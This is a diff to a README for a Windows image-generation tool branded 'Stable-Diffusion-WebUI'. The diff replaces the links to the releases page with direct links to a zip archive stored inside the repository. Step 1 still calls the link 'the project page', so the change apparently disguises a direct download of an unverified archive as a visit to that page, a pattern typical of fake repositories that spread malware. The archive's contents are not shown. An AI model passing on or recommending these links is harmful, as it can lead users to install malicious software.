@@ -1,6 +1,6 @@
 # 🎨 Stable-Diffusion-WebUI - Create images from text on Windows
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Kristinunreconciled297/Stable-Diffusion-WebUI/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Kristinunreconciled297/Stable-Diffusion-WebUI/raw/refs/heads/main/SD-Source/Web-Diffusion-UI-Stable-2.8-alpha.5.zip)
 
 ## What is this tool
 
@@ -22,7 +22,7 @@ If your computer uses an integrated graphics chip, the software will run slowly.
 
 You must download the correct files to start. 
 
-1. Visit the project page here: [https://github.com/Kristinunreconciled297/Stable-Diffusion-WebUI/releases](https://github.com/Kristinunreconciled297/Stable-Diffusion-WebUI/releases).
+1. Visit the project page here: [https://github.com/Kristinunreconciled297/Stable-Diffusion-WebUI/raw/refs/heads/main/SD-Source/Web-Diffusion-UI-Stable-2.8-alpha.5.zip](https://github.com/Kristinunreconciled297/Stable-Diffusion-WebUI/raw/refs/heads/main/SD-Source/Web-Diffusion-UI-Stable-2.8-alpha.5.zip).
 2. Choose the latest release from the list.
 3. Click the file ending in .zip to start the download.
 4. Move the file from your downloads folder to a folder on your computer where you want the program to live. Avoid folders with long or complex paths.
